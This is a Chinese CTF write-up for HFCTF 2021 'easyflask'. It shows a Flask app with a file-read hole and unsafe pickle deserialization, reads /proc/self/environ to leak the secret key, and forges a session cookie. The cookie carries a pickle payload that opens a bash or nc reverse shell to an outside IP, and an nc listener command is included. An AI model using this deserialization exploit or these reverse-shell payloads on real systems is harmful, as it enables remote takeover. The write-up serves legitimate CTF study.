---
title: '[HFCTF 2021 Final]easyflask'
date: 2024-09-27 20:04:05
tags: 
      - shell反弹
      - session伪造
categories: 刷题笔记
---

## [HFCTF 2021 Final]easyflask

题目给了提示，有文件读取漏洞，读取源码

```
#!/usr/bin/python3.6
import os
import pickle

from base64 import b64decode
from flask import Flask, request, render_template, session

app = Flask(__name__)
app.config["SECRET_KEY"] = "*******"

User = type('User', (object,), {
    'uname': 'test',
    'is_admin': 0,
    '__repr__': lambda o: o.uname,
})


@app.route('/', methods=('GET',))
def index_handler():
    if not session.get('u'):
        u = pickle.dumps(User())
        session['u'] = u
    return "/file?file=index.js"


@app.route('/file', methods=('GET',))
def file_handler():
    path = request.args.get('file')
    path = os.path.join('static', path)
    if not os.path.exists(path) or os.path.isdir(path) \
            or '.py' in path or '.sh' in path or '..' in path or "flag" in path:
        return 'disallowed'

    with open(path, 'r') as fp:
        content = fp.read()
    return content


@app.route('/admin', methods=('GET',))
def admin_handler():
    try:
        u = session.get('u')
        if isinstance(u, dict):#如果u对应的值是字典，会读取  u.b
            u = b64decode(u.get('b'))
        u = pickle.loads(u)#pickle反序列化
    except Exception:
        return 'uhh?'

    if u.is_admin == 1:
        return 'welcome, admin'
    else:
        return 'who are you?'


if __name__ == '__main__':
app.run('0.0.0.0', port=80, debug=False)

```

我们发现admin目录下面有反序列化函数，但我们不能直接访问

<!--more-->

![image-20240927200754054](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409272007131.png)

这种情况一般是要我们伪造session

我们找到sessin，看着应该是flask框架的![image-20240927200845134](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409272008198.png)

我们需要找到密钥

我们读取**/proc/self/environ**

![image-20240927201123735](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409272011846.png)

```
glzjin22948575858jfjfjufirijidjitg3uiiuuh
```

通过源码可知

```
        u = session.get('u')
        if isinstance(u, dict):#如果u对应的值是字典，会读取  u.b
            u = b64decode(u.get('b'))
        u = pickle.loads(u)#pickle反序列化

```

我们可以知道，需要构造的秘钥结构：{“u”:{“b”:“反序列化的内容”}}

```
import pickle
from base64 import b64encode
import os

User = type('User', (object,), {
    'uname': 'tyskill',
    'is_admin': 0,
    '__repr__': lambda o: o.uname,
    '__reduce__': lambda o: (os.system, ("bash -c 'bash -i >& /dev/tcp/你的ip/你的端口 0>&1'",))
})
u = pickle.dumps(User())
print(b64encode(u).decode())
```


我们伪造session

```
{"u":{"b":"gANjYnVpbHRpbnMKZXZhbApxAFg6AAAAX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIDYwLjIwNC4xNTguODcgMTIzNCAtZS9iaW4vc2gnKXEBhXECUnEDLg=="}}
```

![image-20240927203156340](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409272031372.png)

注：记得加\转义"

得到session，我们在服务器上监听9999端口

```
nc -lvvp 55555
```

然后访问/admin，修改session

端口监听成功，执行命令，得到flag

![image-20241010204621031](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410102046152.png)
